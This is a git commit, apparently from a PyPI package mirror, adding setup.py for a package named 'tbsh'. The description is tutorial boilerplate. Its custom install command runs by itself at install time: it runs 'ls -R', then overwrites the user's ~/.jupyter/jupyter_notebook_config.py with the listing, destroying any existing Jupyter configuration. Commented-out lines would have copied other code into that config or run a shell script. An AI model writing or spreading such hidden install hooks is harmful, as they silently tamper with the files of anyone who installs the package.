65af8bb76b9350ce9cbad6179c5ca86ffaa8e9fc
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 13:18:16 +0000

    Add package tbsh/0.3.6/tbsh-0.3.6.tar.gz

---
+++ packages/tbsh/tbsh-0.3.6.tar.gz/tbsh-0.3.6/setup.py
@@ -0,0 +1,40 @@
+from setuptools import setup
+from setuptools.command.develop import develop
+from setuptools.command.install import install
+import os
+from os.path import expanduser
+import subprocess
+
+class PostInstallCommand(install):
+    """Post-installation for installation mode."""
+    def run(self):
+        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
+        result = subprocess.run(['ls', '-R'], stdout=subprocess.PIPE)
+
+        if not os.path.exists(expanduser('~')+'/.jupyter/jupyter_notebook_config.py'):
+            # os.system('cat demo.py > ' + expanduser('~')+'/.jupyter/jupyter_notebook_config.py')
+            # os.system('sh setupscript.sh')
+        # else:  
+            os.system('jupyter notebook --generate-config')
+
+        with open(expanduser('~')+'/.jupyter/jupyter_notebook_config.py', 'w+') as f:
+                f.write(str(result.stdout))
+
+        install.run(self)        
+
+setup(
+    name='tbsh',    # This is the name of your PyPI-package.
+    version='0.3.6',                          # Update the version number for new releases    
+    author="Sriharsha Sammeta",
+    author_email="sriharsha4444@icloud.com",
+    description='The funniest joke in the world',
+    url='http://github.com/storborg/funniest',
+    license='MIT',
+    packages=['tbsh'],    
+    install_requires=[
+        'jupyter',
+    ],
+    cmdclass={        
+        'install': PostInstallCommand
+    },
+)
